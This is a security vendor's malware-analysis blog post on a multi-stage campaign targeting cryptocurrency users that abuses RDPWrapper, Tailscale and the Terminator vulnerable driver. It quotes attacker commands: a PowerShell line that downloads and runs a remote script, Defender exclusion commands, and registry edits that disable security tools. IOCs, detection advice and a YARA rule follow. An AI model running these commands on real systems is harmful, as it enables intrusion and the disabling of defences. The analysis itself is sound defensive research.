@@ -1,0 +1,455 @@
+ 
+ New Malware Targets Crypto Users Via RDPWrapper, Tailscale 
+ Skip to content 
+ Search 
+ Search 
+ Experiencing a Breach? 
+ Talk to Sales 
+ Switch to Cyble 
+ Marketplace 
+ AWS 
+ Azure 
+ +1 678 379 3241 
+ Experiencing a Breach? 
+ Talk to Sales 
+ Switch to Cyble 
+ Marketplace 
+ AWS 
+ Azure 
+ +1 678 379 3241 
+ EN 
+ Close EN 
+ Open EN 
+ EN - Global 
+ EN - AU 
+ EN - EU 
+ EN - GB 
+ EN - NZ 
+ ID - ID 
+ DE - DE 
+ FR - FR 
+ Platform 
+ Close Platform 
+ Open Platform 
+ Recognized among the world's leading threat intelligence platforms 
+ Harness the power of Agentic AI and actionable threat intelligence to strengthen your organization’s cybersecurity strategy with precision, adaptability, and autonomy. 
+ Request Demo 
+ Cyble Blaze AI Agentic AI 
+ Threats move in seconds. Traditional tools respond in hours. Cyble BlazeAI hunts, reasons, and acts autonomously within minutes. 
+ Cyble Hawk Federal Bodies 
+ Specialized platform protecting federal bodies with advanced threat detection and intelligence. 
+ Cyble Vision Threat Intel + DRP + TIP 
+ Cyble Vision is an award-winning threat intelligence platform delivering real-time cyber threat detection and response for enterprises. 
+ Cyble Titan Endpoint Security 
+ Take control of internal and external threats with Cyble Titan—the only agent-based endpoint security platform. 
+ Solutions 
+ Close Solutions 
+ Open Solutions 
+ AI-Driven Cybersecurity Solutions 
+ Award Winning Cybersecurity 
+Solutions 
+ Empower your organization with Cyble’s Agentic AI-driven threat intelligence — adaptive, autonomous, and tailored to outsmart evolving cyber threats with precision. 
+ Learn More 
+ Attack Surface Management 
+ Brand Intelligence & Protection 
+ Cyber Threat Intelligence 
+ Dark Web Monitoring 
+ Vulnerability Intelligence 
+ Takedown and Disruption 
+ Third Party Risk Management 
+ Digital Forensics & Incident Response 
+ Physical Security Intelligence 
+ Executive Monitoring 
+ BotShield 
+ Incident Management 
+ Agentic AI Cybersecurity 
+ Endpoint Security 
+ Resources 
+ Close Resources 
+ Open Resources 
+ Insights 
+ Thought Leadership 
+ Expert viewpoints on the evolving cybersecurity and risk landscape. 
+ Blog 
+ Deep analyses and insights on cyber trends, threats, and industry developments. 
+ Knowledge Hub 
+ Actionable intelligence and resources to enhance security decision-making. 
+ Case Studies 
+ Real-world stories showcasing Cyble’s impact across sectors and geographies. 
+ Threat Actor Profiles 
+ Comprehensive intelligence on global threat groups and their operations. 
+ Downloadables 
+ Data Sheets 
+ Overviews of Cyble’s products, features, and core capabilities. 
+ Research Reports Download Report 
+ In-depth analyses of regional and global cyber threat trends. 
+ Whitepapers & eBook Download 
+ Expert research and frameworks addressing key cybersecurity challenges. 
+ Media 
+ Events 
+ Highlights from Cyble’s global conferences, industry expos, and thought-leadership forums. 
+ Webinars 
+ Expert-led sessions exploring emerging cybersecurity challenges and solutions. 
+ Podcasts 
+ Engaging discussions with security leaders on intelligence, innovation, and resilience. 
+ Free Tools 
+ Malware Analyzer New 
+ Detonate, scan, and pivot on any threat. 
+ External threat Assessment Report free 
+ Complimentary evaluation of your organization’s external risks. 
+ Company 
+ Close Company 
+ Open Company 
+ Why Cyble? 
+ Cyble closes the cybersecurity defense gap with one AI-native platform built on real-time intelligence. Governments, enterprises, and security teams worldwide rely on it to see more, act faster, and stay ahead of threats. 
+ Schedule Demo 
+ About Cyble 
+ Our journey, mission, and leadership. 
+ Press 
+ Cyble in the news. 
+ Careers We’re hiring 
+ Build what’s next in cybersecurity. 
+ Contact Us 
+ Reach our team for support or general inquiries. 
+ Compare Cyble 
+ See how Cyble stacks up against alternatives. 
+ Success Stories 
+ Real results from security teams like yours. 
+ Integrations 
+ Plug Cyble into your existing security stack. 
+ We've Just Won! 
+ Partners 
+ Close Partners 
+ Open Partners 
+ Cyble Partner Network (CPN) Join Us 
+ Join Cyble's Partner Network to collaborate and innovate in cybersecurity. This platform offers unique opportunities for partnerships, fostering growth and shared success in tackling cyber threats together. 
+ Cyble for MSSPs 
+ Maximise profitability and empower customers with stronger security. 
+ Become a Partner Register 
+ Elevate your cybersecurity business with the Cyble Partner Network: Access cutting-edge tools, expert support, and growth opportunities. Ideal for MSSPs, resellers, and alliances. 
+ Partner Login 
+ Access your Cyble Partner Network account to manage resources, track opportunities, and collaborate efficiently. 
+ Get Demo 
+ Login 
+ Trending 
+ Recognition: Cyble Recognized in Forrester’s External Threat Intelligence Service Providers Landscape, Q1 2026 
+ Recognition: Cyble Recognized as 2026 Gartner® Peer Insights™ Strong Performer 
+ Report: Global Cybersecurity Report 2025 
+ Report: Europe Threat Landscape Report 2025 
+ Report: APAC Cyber Threat Landscape Report 2025 
+ Report: North America Cyber Threat Landscape Report 2025 
+ Report: META Threat Landscape Report 2025 
+ Recognition: Cyble Recognized in Forrester’s External Threat Intelligence Service Providers Landscape, Q1 2026 
+ Recognition: Cyble Recognized as 2026 Gartner® Peer Insights™ Strong Performer 
+ Report: Global Cybersecurity Report 2025 
+ Report: Europe Threat Landscape Report 2025 
+ Report: APAC Cyber Threat Landscape Report 2025 
+ Report: North America Cyber Threat Landscape Report 2025 
+ Report: META Threat Landscape Report 2025 
+ ee-track">
+ Report: Global Cybersecurity Report 2025 
+ Report: Europe Threat Landscape Report 2025 
+ Report: APAC Cyber Threat Landscape Report 2025 
+ Report: North America Cyber Threat Landscape Report 2025 
+ Report: META Threat Landscape Report 2025 
+ Recognition: Cyble Recognized as 2026 Gartner® Peer Insights™ Strong Performer 
+ Recognition: Cyble Recognized in Gartner® Hype Cycle™ 2025 
+ Recognition: Cyble Named in Gartner® Hype Cycle™ for Managed IT Services 2025 
+ Report: Global Cybersecurity Report 2025 
+ Report: Europe Threat Landscape Report 2025 
+ Report: APAC Cyber Threat Landscape Report 2025 
+ Report: North America Cyber Threat Landscape Report 2025 
+ Report: META Threat Landscape Report 2025 
+ Recognition: Cyble Recognized as 2026 Gartner® Peer Insights™ Strong Performer 
+ Recognition: Cyble Recognized in Gartner® Hype Cycle™ 2025 
+ Recognition: Cyble Named in Gartner® Hype Cycle™ for Managed IT Services 2025 
+ Link copied! 
+ Home 
+ / 
+ Blog 
+ / 
+ New Malware Campaign Abusing RDPWrapper and Tailsca… 
+ Malware 
+ New Malware Campaign Abusing RDPWrapper and Tailscale to Target Cryptocurrency Users  
+ Threat actors spotted creating a reverse connection to target cryptocurrency users by leveraging RDPWrapper and Tailscale. 
+ July 17, 2024 · 14 min read 
+ // On this page 
+ Share 
+ Key Takeaways  
+ Cyble Research and Intelligence Labs (CRIL) has uncovered a multi-stage cyberattack campaign with a Zip file containing a malicious shortcut (.lnk) file.   
+ When the shortcut is executed, it downloads a PowerShell script, initiating a chain of events that ultimately allows the Threat Actor (TA) to gain Remote Desktop Protocol (RDP) access to the victim’s system.  
+ The infection involves various components, including PowerShell scripts, batch files, Go-based binaries, and a vulnerable driver.   
+ Notably, the TA appears to be planning a Windows BYOVD (Bring Your Own Vulnerable Driver) attack, using a driver known as Terminator (Spyboy).   
+ A key aspect of this campaign is using RDPWrapper to facilitate RDP connections and Tailscale to connect to the TA’s private network, which is a relatively new technique.    
+ This campaign seems to target individuals associated with the cryptocurrency industry. It uses a decoy PDF related to cryptocurrency futures trading on CoinDCX, a popular Indian crypto exchange. This decoy choice suggests that the threat actor (TA) might specifically target users in India, indicating a geographic focus for the attack.  
+ During our investigations, we found that the decoy PDF used in this campaign was also used in a StealC infection chain, suggesting that the same TA could be behind this attack.   
+ Summary  
+ CRIL has discovered a multi-stage cyberattack campaign that starts with a Zip file containing a malicious shortcut file (.lnk). As of now, the source of this Zip file is unknown, but we suspect it to be spreading through phishing emails.  The .lnk file, on execution, downloads a PowerShell script that eventually allows the Threat Actor (TA) to gain RDP access to the victim’s system. To mislead victims, a decoy PDF related to cryptocurrency trading on CoinDCX is presented on the victim’s screen, indicating a possible focus on Indian users.   
+ The attack involves various components, including PowerShell scripts, batch files, Go-based binaries, and vulnerable drivers. The TA appears to be planning a Windows BYOVD attack using the Terminator (Spyboy) driver, which was not executed during the initial infection but may be executed after gaining a remote connection.  
+ The TA has leveraged legitimate applications, including RDPWrapper for remote access and Tailscale for connecting to the TA’s private network. Tailscale is a virtual private network (VPN) that allows users to create private networks where devices can connect directly to each other using encrypted connections. It includes a web-based management service for easy administration and configuration.  
+ The threat actor (TA) attempts to establish a reverse connection in this attack. They use Tailscale authentication to add the victim’s machine as a node on their private network. In this scenario, the TA does not connect directly to the victim’s system; instead, the victim’s system initiates the reverse connection. The TAs have leveraged RDPWrapper as the RDP client. Usually, Windows allows only one RDP session per PC, but RDPWrapper enables multiple sessions per user.  
+ Figure 1 – Infection Chain  
+ Technical Analysis  
+ The initial infection begins with a Zip archive containing a shortcut (.lnk) file. When executed, this shortcut file downloads and runs an obfuscated PowerShell script. The .lnk file executes the following command:  
+ C:\Windows\system32\cmd.exe /C pOwErShELL -w H $ThKEdEe = ‘aiVmHYsJXPJviCKnBWtcRvqqxjcMZEfqqesAlsXPWDuJo’; iEx(irm hxxps://cloudflareupdate[.]co/XmSI.txt )   
+ The above command downloads the PowerShell script from hxxps://cloudflareupdate[.]co/XmSI.txt and executes it.   
+ The figure below shows the XBIb.txt.  
+ Figure 2 – XBIb.txt  
+ Mutex Creation  
+ This PowerShell script includes a base64-encoded content that functions as a dropper. It performs the following operations:  
+ Creates two mutex named “RUNNING” and “STARTUAC,” using System.Threading.Mutex() function. This ensures that only one instance of the script is running.   
+ The figure below shows the script creating Mutex.  
+ Figure 3 – Creates Mutex  
+ UAC Validation  
+ The script then checks if User Account Control (UAC) is enabled on the system by querying the registry key “HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System.EnableLUA.” If this value is set to one, UAC is enabled. It also retrieves the value of “HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System.ConsentPromptBehaviorAdmin” and stores it in the variable isUACOpen. This value determines the behavior of the consent prompt for administrators.   
+ The figure below illustrates the code used for the UAC check.   
+ Figure 4 – Checks the Status of UAC  
+ Suppose UAC is disabled or the value of isUACOpen is set to 0, indicating that the administrator can perform operations requiring elevation without consent or credentials. In that case, the script executes the command mentioned in the figure below.  
+ Figure 5 – Checks if UAC is Enabled  
+ Adding Exclusions  
+ This command starts the Command Prompt with elevated (administrator) privileges. Within the elevated Command Prompt, powershell.exe is run with specific parameters to hide its window and bypass execution policies.  
+ The PowerShell command:  
+ Add-MpPreference -ExclusionPath $env:APPDATA; Add-MpPreference -ExclusionPath $env:TEMP    
+ adds the %temp% and “%APPDATA%\Roaming” directory to the exclusion list for Windows Defender, preventing it from scanning these directories.  
+ Then, it decrypts the embedded binary, drops it in the “% AppData%Roaming” directory as “cvnPCrQdkzwdMrWimioArHeGeMPPl.exe,” and executes it.   
+ The figure below shows the script dropping the binary.   
+ Figure 6 – Dropping Binary  
+ If the UAC is enabled and the operations cannot be performed without consent or credentials, this script runs an indefinite loop to execute the same PowerShell commands mentioned above. It uses exception handling to ensure the script runs successfully even if there are initial failures and retries every 2 seconds after an exception is met.   
+ Figure 7 – Running Indefinite Loop  
+ Go based Loader  
+ The binary dropped above is a 64-bit Go-based loader. On execution, it checks if it’s running with admin privileges. If not, it spawns itself with elevated privileges using the “runAs” command, as shown in the figure below.   
+ Figure 8 – Runs Itself with Elevated Privileges  
+ Now, it loads a decoy PDF named “DCXFutures.pdf” from its resources. It drops this clean PDF in the %temp% directory and assigns it a random name using a string of ten digits. The PDF is then displayed to the victim, as shown in the figure below.   
+ Figure 9 – Drops Decoy PDF  
+ This PDF contains a detailed guide about future cryptocurrency trading on the CoinDCX platform. CoinDCX is a cryptocurrency exchange platform based in India, so we suspect that the target might be from India.  
+ Figure 10 – Decoy PDF  
+ After executing the preceding operations, the loader dynamically generates a batch script named in the format script_<number>.bat. This script is created and saved in the %temp% directory, as illustrated in the figure below. Once the script is created, it is executed, and upon successful execution, it is deleted to eliminate any traces of the infection.   
+ Figure 11 – Drops Batch Script  
+ This batch script dynamically constructs URLs and filenames for downloading executable files. It downloads files using curl from the following URLs:  
+ hxxp[:]//microsoft-windows.cloud/adr.exe,   
+ hxxp[:]//microsoft-windows.cloud/Terminator.sys  
+ hxxp[:]//microsoft-windows.cloud/main.exe  
+ It renames adr.exe and main.exe to a random numeric string before saving and executing them. This script does not contain the code to execute the Terminator.sys file. The figure below shows the batch script.  
+ Figure 12 – Batch Script  
+ GoDefender: Adr.exe  
+ This is a 64-bit GoLang binary sourced from an open-source project named GoDefender on GitHub. It offers robust functionality to detect and defend against various debugging tools and virtualization environments.   
+ The figure below shows the GitHub URL embedded in the binary.   
+ Figure 13 – GoDefender  
+ This Go binary performs both anti-virtualization and anti-debugging. It terminates processes related to malware analysis using the command “taskkill /F /IM,” as shown in the figure below. Additionally, it executes the command “wmic diskdrive get model” to identify sandbox environment.  
+ Figure 14 – Terminates Process  
+ BYOVD (Bring Your Own Vulnerable Driver): Terminator.sys  
+ This is a legitimate Windows driver. Due to vulnerabilities in its counterparts, zam32.sys and zam64.sys, this version is often associated with various bypasses or malware. Terminator is reportedly capable of bypassing 24 different antivirus (AV), Endpoint Detection and Response (EDR), and Extended Detection and Response (XDR) security solutions, including Windows Defender, on devices running Windows 7 and later. Terminator drops a legitimate, signed Zemana anti-malware kernel driver named zamguard64.sys or zam64.sys.   
+ Threat actors (TAs) have also reported Terminator multiple times. In one instance, BlackCat ransomware utilized it in its operations.  
+ Figure 15 – zam64  
+ RdpWrapper/TailScale: main.exe  
+ The main.exe acts as an installer for RDPWrapper and configure TailScale. Upon execution, it runs a PowerShell script, as shown in the figure below. It sets up a PowerShell command to execute it using the os_exec_Command() function. The PowerShell command is encoded in Base64.  
+ Figure 16 – Executes PoweShell Script  
+ This PowerShell script initially configures the system to facilitate multiple concurrent Remote Desktop sessions per user and to relax the security policy for using blank passwords, as shown in the figure below.   
+ Figure 17 – Configuring RDP Settings  
+ After this, it disable various notification systems, restricts certain system functionalities for the current user, and prevents specific services from running by making changes to the following registry entries:  
+ Disabling toast notifications, balloon tips, and the Notification Center.  
+ reg add “HKCU\Software\Policies\Microsoft\Windows\Explorer” /v DisableNotificationCenter /t REG_DWORD /d 1 /f  
+ Suppressing notifications from Windows Defender.  
+ reg add “HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Notifications” /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f  
+ Disabling access to Task Manager and the command prompt for the current user.  
+ reg add “HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System” /v DisableTaskMgr /t REG_DWORD /d 1 /f  
+ reg add “HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System” /v DisableCMD /t REG_DWORD /d 1 /f  
+ Removing the Run command from the Start menu for the current user.  
+ reg add “HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer” /v NoRun /t REG_DWORD /d 1 /f  
+ Preventing the Security Health service from starting automatically.  
+ reg delete “HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /v SecurityHealth /f  
+ These modifications may aim at defense evasion and reduce user interruptions, enhancing control over the system’s behavior.   
+ Figure 18 – Altering Registry  
+ Afterward, it automates the installation and configuration of the RDPWrapper (Remote Desktop Protocol. The script starts by executing an executable (743gnd8.exe – RDP installer file), which is dropped by main.exe in the %temp% directory. It uses specific arguments (-i -s) for installation in a hidden window. It fetches the RDPWraper configuration file from hxxps://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/master/rdpwrap.ini.   
+ The figure below shows the RDPWrapper installation code.   
+ Figure 19   – Installing RDPWraper  
+ Afterward, the script creates a new local user account named “luxGO2GH7fzo9Uo” with administrative privileges and uses Chocolatey to install Tailscale. Tailscale is a VPN service used to set up secure, private networks. The script includes a hardcoded Tailscale authentication key. The victim’s machine is added to the attacker’s private network using this key.   
+ Figure 20 – Hardcoded Tailscale Auth Key  
+ After this, it executes reg delete commands on the following registry keys to eliminate traces of the Tailscale installation.  
+ reg delete “HKEY_LOCAL_MACHINE\SOFTWARE\Classes\*\shell\tailscale” /f  
+ reg delete “HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{c4aca4d4-d6ee-48a2-a4f0-612c3f06aad4}  
+ Then, it creates a startup shortcut to run “adr.exe” automatically upon user login. Next, it installs the OpenSSH server, starts the SSH service, and sets it to run automatically on system startup, as shown in the Figure below.   
+ Figure 21 – Starts SSH service  
+ Once an attacker gains Remote Desktop Protocol (RDP) access, they have significant control over the connected device. They can deploy malware and ransomware, leading to data loss, financial theft, and service disruption. They can steal sensitive information, including personal data, business secrets, and intellectual property. The compromised system can also serve as a launchpad for further attacks within the network, allowing the attacker to pivot to other devices, escalate privileges, or move laterally. Additionally, the attacker can execute commands on the compromised system, potentially compromising other systems or performing reconnaissance.  
+ Additional Information  
+ Our investigations found that the decoy PDF used in this campaign was also used in a StealC infection chain. Interestingly, the initial file delivering StealC (SHA256:   22370d27ad889faf5cd15bce36f6b6ef8c6a542e1ab97e744a021e75d63762bf) was named “Cryptocurrency Trading Specialist Job Opportunity.exe”. There is a possibility that the same TA could be behind both attacks, targeting Crypto users.   
+ Conclusion  
+ This campaign possibly involves planning to execute a Windows BYOVD (Bring Your Own Vulnerable Driver) attack using the Terminator (Spyboy) driver. Although this driver was not activated during the initial infection, the TA likely intends to exploit it once they have established a remote connection. Additionally, the campaign uses legitimate applications like RDPWrapper for RDP access and Tailscale to connect to the TA’s private network. While APT groups such as Kimusky have leveraged RDPWrapper in their attacks, there have not been many reports of attacks utilizing Tailscale and RDPWrapper together.  
+ Our Recommendations  
+ Implement monitoring to identify and alert on the execution of base64-encoded PowerShell scripts. Attackers frequently use these scripts to obfuscate malicious activities, making detection crucial for maintaining security.  
+ Implement monitoring to detect and alert on the installation of unauthorized software, such as RDP wrappers. Keeping an eye on unexpected software installations can help identify potential threat actor activities early.  
+ Regularly track changes to User Account Control (UAC) related registry keys, such as “EnableLUA” and “ConsentPromptBehaviorAdmin.” Monitoring these keys helps in identifying potential attempts to bypass UAC, enhancing system protection against unauthorized changes.  
+ Set up alerts for any modifications to Windows Defender exclusion paths, particularly those adding %APPDATA% and %TEMP% directories. Attackers often modify these paths to exclude malicious files from being scanned, making it essential to detect and respond to such changes promptly.  
+ Strengthen the security of Remote Desktop Protocol (RDP) by enforcing strong authentication mechanisms, such as multi-factor authentication (MFA), and by using network-level authentication (NLA). Limiting RDP access to trusted IP addresses and utilizing VPNs can also help mitigate risks.  
+ Use network segmentation to limit the spread of any potential compromises. By isolating critical systems and sensitive data, you can reduce the impact of an attacker gaining access through an RDP wrapper.  
+ MITRE ATT&CK® Techniques  
+ Tactic    Technique    Procedure   Execution   (TA0002)   User Execution( T1204 )   .lnk file requires user to execute it.    Execution   (TA0002)   Command and Scripting  Interpreter( T1059 )  Uses PowerShell and Batch scripts.  Persistence  (TA0003)   Registry Run Keys / Startup   Folder ( T1547.001 )  Creates a start menu entry (Start Menu\\Programs\\Startup)  Persistence  (TA0003)   External Remote Services ( T1133 )  Uses Tailscale and RDPWrapper  Privilege   Escalation  (TA0004)   Abuse Elevation Control  Mechanism ( T1548 )  Bypass User Account Control  Privilege   Escalation  (TA0004)   Access Token Manipulation  ( T1134.001 )    Uses runas command.  Defense Evasion  (TA0005)   Obfuscated Files or   Information ( T1027 )  Use XOR encrypted PowerShell script.  Defense Evasion  (TA0005)   Indicator Removal ( T1070.004 )  Deletes batch script.   Discovery   ( TA0007 )  Process Discovery ( T10 57)  Queries a list of all running processes.  Discovery   ( TA0007 )  Security Software Discovery  ( T1518.001 )  May try to detect the virtual machine to   hinder analysis  C&C  (TA0011)   Remote Access Software  ( T1219 )  Uses RDPWrapper and Tailscale.  
+ Indicators of Compromise (IOCs) 
+ Indicators     Indicator   Type   Description   29c30a709d40929e2f75190c8dfe5bc6e2e57c3ad9f317604802604f36e23946  SHA26  Zip  fc94bba834b8f695322a9ffa4040676f8e88c2c9ca267c793f86c04b3f6ceac9  SHA256  XmSI.txt  07c9aaa69901be5990bbb084bf26f74de7094ab25c34968898edefae9ea15fc7  SHA256  Lnk File  1bb5fbb1521558440aea448422dcf911ca81ae8936011caa444eb1adb95743cb   SHA256  Lnk File  4076564c6a199e8809f9a2a0ff2e3ad96fa5fa9283b410a4731ea196c2783531  SHA256  cvnPCrQdkzwdMrWimioArHeGeMPPl.exe  61b3d8aae0803455432b65db40fef4e92749491bbd98c07eefec8aed636a4c48  SHA256  Batch Script  543991ca8d1c65113dff039b85ae3f9a87f503daec30f46929fd454bc57e5a91  SHA256  Terminator.sys  f7224264aef52f80f5df9068e2f0ebcd1961dd39aa87acb79b3b67b7e5c8f2d1  SHA256  adr.exe  f808ed40113b30deb348fba32f60236acf160c9bb95cdd42099a24ee2dc31076  SHA256  main.exe  hxxps[:]//cloudflareupdate.co/XmSI.txt hxxp[:]//microsoft-windows.cloud/adr.exe  hxxp[:]//microsoft-windows.cloud/Terminator.sys hxxp[:]//microsoft-windows.cloud/main.exe hxxps[:]//cloudflareupdate.co/XBIb.txt  URL  Malicious URL  
+ Yara Rule  
+ rule GoLoader{ 
+meta: 
+author = "Cyble Research and Intelligence Labs" 
+description = "Detects GoLoader" 
+date = "2024-07-16" 
+os = "Windows" 
+strings: 
+$a1 = "curl -o" ascii wide 
+$a2 = "enabledelayedexpansion" fullword ascii wide 
+$a3 = "randFile3=%random%%random%.exe" nocase ascii wide 
+condition: 
+ uint16(0) == 0x5A4D and all of them 
+} 
+ CYBLE. 
+ AI Threat Intelligence 
+ Stop Executive Threats Before They Strike 
+ See how proactive visibility compares to reactive alerts. 
+ Request a Demo
+ CYBLE TITAN 
+ Agentic EDR Platform 
+ There's a faster way to stop threats on your endpoints. 
+ Built for security teams who need speed, clarity, and confidence at scale. 
+ Start Your Free Trial Today
+ /#cbp-subscribe lands below the sticky header instead of
+ underneath it. Keep the id even though nothing in this template links
+ to it -- the links live in campaign emails and other pages. -->
+ Stay Informed 
+ The Cyber Briefing Security Teams Actually Read! 
+ Join security teams across 50+ countries getting Cyble's weekly research, advisories, and analyst insights. 
+ Work email * 
+ I agree to the collection and use of my email address for this request. * 
+ For information about Cyble's privacy practices, please review our Privacy Notice . 
+ Please provide your consent to continue. 
+ Subscribe now
+ No spam, ever. Unsubscribe anytime.
+ Live Platform 
+ Start Your 30-Day Free Trial 
+ Gartner Peer Insights 
+ 4.8 / 5 
+ G2 User Rating 
+ 4.8 / 5 
+ Schedule a Demo
+ Previous Post 
+ Investigating the New Jellyfish Loader  
+ Next Post 
+ Threat Actors Exploit Recent CrowdStrike Outage to Ramp Up Suspicious Domain Creation 
+ More from Cyble 
+ View all posts
+ Ransomware 
+ AI-Powered Ransomware Is Coming for UK Critical Infrastructure, and Europe Is Already the Testing Ground 
+ Nov 5, 2026 
+ · 
+ 11 min read 
+ Malware 
+ From Hijacked PBX to Stolen Trunk: INJ3CTOR3’s Campaign Evolves 
+ Oct 28, 2026 
+ · 
+ 18 min read 
+ Brand Monitoring 
+ Know How Cyble Brand Intelligence Can Help Stop ClickFix Campaigns in its Tracks 
+ Oct 26, 2026 
+ · 
+ 7 min read 
+ Schedule a Personalized Demo 
+ Book a Demo 
+ X-twitter 
+ Linkedin 
+ Youtube 
+ AI-Native Cyber Threat Intelligence Platforms 
+ Main Menu 
+ Cyble Vision Cyble Hawk 
+ Agentic AI 
+ Main Menu 
+ Cyble Blaze AI 
+ Endpoint Security 
+ Main Menu 
+ Cyble Titan 
+ Why Cyble? 
+ Main Menu 
+ Compare Cyble Industry Recognition Customer Stories 
+ Cybersecurity Solutions 
+ Main Menu 
+ Attack Surface Management Brand Intelligence Threat Intelligence Platform Dark Web Monitoring Takedown and Disruption Vulnerability Intelligence Third-Party Risk Management (TPRM) Physical Threat Intelligence Executive Monitoring BotShield Incident Management Digital Forensics & Incident Response Endpoint Security 
+ Resources 
+ Main Menu 
+ Thought Leadership Blog Knowledge Hub Threat Actor Profiles SAMA Compliance Events Data Sheets Case Studies Research Reports Whitepapers External Threat Assessment Report Podcasts Webinars 
+ Company 
+ Main Menu 
+ About Cyble Leadership Team Integrations Press Vulnerability Disclosure Contact Us Cyble LLMs Info 
+ Other Links 
+ Main Menu 
+ Cyble's Privacy Notice Cyble Vision's Privacy Notice Cyble's Cookie Notice Cyble's Trust Portal DSRR Form 
+ Protecting organizations worldwide with AI-powered threat intelligence. Offices across the globe, vigilant around the clock. 
+ United States 
+ Europe & UK 
+ META 
+ ASEAN 
+ India & SAARC 
+ Oceania 
+ ©2019 – 2026. Cyble Inc. | World’s Leading Threat Intelligence Platform & AI-Native Security Company. All Rights Reserved 
+ Made with ❤️ from Cupertino, USA 
+ Request a demo 
+ Research Reports 
+ 408-753-4000 " href="https://cyble.com/talk-to-sales/">
+ Talk To Sales 
+ Cookie Consent We use essential cookies to operate and secure this website. With your consent, we also use optional analytics and performance cookies. Manage or withdraw your consent at any time in the Cookie Preference Centre. See our Privacy Notice and Cookie Notice for details. 
+ Preferences Reject Accept All Manage Cookie Preferences × Choose which cookie categories you allow. You can change this at any time from Application Settings. View Cookie Notice 
+ Toggle Strictly Necessary* Strictly Necessary* Essential for the operation and security of the website. These cookies cannot be disabled. Name Description Duration drscc Session cookie on Zoho's file-serving domain, tied to embedded document/asset load. Session LS_CSRF_TOKEN CSRF protection on Zoho SalesIQ chat backend. Session __cf_bm Distinguishes human visitors from automated traffic to support website security and prevent abuse. 30 minutes Cookie Preferences This cookie is used to store the user's cookie consent preferences. 30 days Toggle Google Tag Manager Google Tag Manager Google Tag Manager simplifies the management of marketing tags on your website without code changes. Name Description Duration td Registers statistical data on users' behaviour on the website. Used for internal analytics by the website operator. session cookiePreferences Registers cookie preferences of a user 2 years Toggle Login Login These cookies are used for managing login functionality on this website. Name Description Duration wordpress_logged_in Used to store logged-in users. Persistent wordpress_sec Used to track the user across multiple sessions. 15 days wordpress_test_cookie Used to determine if cookies are enabled. Session Toggle Analytics Analytics Help us understand how the platform is used so we can monitor performance and improve functionality. Name Description Duration _gat_UA-201575643-1 Legacy Google Universal Analytics — deprecated by Google, pending removal from GTM. Session _leadgenie_session Aplo intent-data/marketing tracking — session identifier. Session factors-ai-tracking Factors.ai — B2B visitor/account intelligence tracking. N/A zi-tracking-script ZoomInfo tracking script, hardcoded in site header. N/A apollo-tags Two separate Apollo.io GTM tags — meetings widget and visitor tracking. N/A ahrefs-analytics Ahrefs SEO visitor analytics tracking. N/A _cfuvid ZoomInfo visitor identification for lead intelligence. Session g2tracking G2 review widget tracking. Varies apolloAnonId Apollo.io visitor/lead identification and scoring. Varies _clck Microsoft Clarity session recording/behavior analytics (covers _clsk, MUID, ANONCHK, CLID, SM). Varies utm_source First-party parameter storing which marketing campaign/link referred the visitor, used for internal attribution. 7 days utm_medium First-party parameter storing which marketing campaign/link referred the visitor, used for internal attribution. 7 days Toggle Google Analytics Google Analytics Google Analytics is a powerful tool that tracks and analyzes website traffic for informed marketing decisions. Service URL: policies.google.com (opens in a new window) Name Description Duration _ga ID used to identify users 2 years _gali Used by Google Analytics to determine which links on a page are being clicked 30 seconds _ga_ ID used to identify users 2 years _gid ID used to identify users for 24 hours after last activity 24 hours _gat Used to monitor number of Google Analytics server requests when using Google Tag Manager 1 minute __utmb Used to distinguish new sessions and visits. This cookie is set when the GA.js javascript library is loaded and there is no existing __utmb cookie. The cookie is updated every time data is sent to the Google Analytics server. 30 minutes after last activity __utmc Used only with old Urchin versions of Google Analytics and not with GA.js. Was used to distinguish between new sessions and visits at the end of a session. End of session (browser) __utmz Contains information about the traffic source or campaign that directed user to the website. The cookie is set when the GA.js javascript is loaded and updated when data is sent to the Google Anaytics server 6 months after last activity __utmv Contains custom information set by the web developer via the _setCustomVar method in Google Analytics. This cookie is updated every time new data is sent to the Google Analytics server. 2 years after last activity __utmx Used to determine whether a user is included in an A / B or Multivariate test. 18 months _gac_ Contains information related to marketing campaigns of the user. These are shared with Google AdWords / Google Ads when the Google Ads and Google Analytics accounts are linked together. 90 days __utma ID used to identify users and sessions 2 years after last activity __utmt Used to monitor number of Google Analytics server requests 10 minutes Toggle Advertising Advertising Deliver relevant advertisements, limit repeated ad displays, and measure the effectiveness of advertising campaigns. Name Description Duration __gads Google Ads — ad personalisation, campaign tracking, delivery/frequency capping (covers __gpi, __eoi, _gcl_au). 13 months MR Microsoft/Bing Ads campaign performance tracking (covers SRM_B, MUID on bing.com). Varies test_cookie DoubleClick — checks third-party cookie support. 1 day aplo-intent-pixel Aplo intent-data/marketing tracking pixel. N/A adroll-exchange-partners AdRoll's ad-exchange cookie-sync partners (3lift, Xandr, Sharethrough, Agkn, Eyeota, PubMatic, OpenX, Taboola, Outbrain). N/A zoho-google-ads-combined Combined custom GTM tag mixing Zoho and Google Ads tracking code. N/A TDCPM The Trade Desk — programmatic ad bidding/targeting (covers TDID). 1 year TapAd_3WAY_SYNCS Tapad — cross-device identity graph for ad targeting (covers TapAd_DID, TapAd_T). Varies _rdt_uuid Reddit Ads conversion pixel. 3 months linkedin-gtm-tags Additional LinkedIn GTM tags — 3 separate LinkedIn tags total. N/A bcookie LinkedIn Insight Tag — ad conversions, audience building (covers li_sugr, lidc, li_adsId) Varies facebook-pixel Meta/Facebook Pixel — ad conversion tracking and retargeting (2 tag instances confirmed in GTM). N/A __adroll AdRoll retargeting, cross-device tracking, and campaign attribution (covers __adroll_fpc, __adroll_shared, __ar_v4, adroll_dqs, adroll_flgs). 1 year gclid (uncategorised, discovered) Google Ads click ID parameter. 1 month Toggle OptinMonster OptinMonster OptinMonster is a powerful lead generation tool that helps businesses convert visitors into subscribers and customers. Service URL: optinmonster.com (opens in a new window) Name Description Duration om-global-cookie / omGlobalSuccessCookie Used to prevent any future OptinMonster campaigns from showing on your site.  Session _omappvs 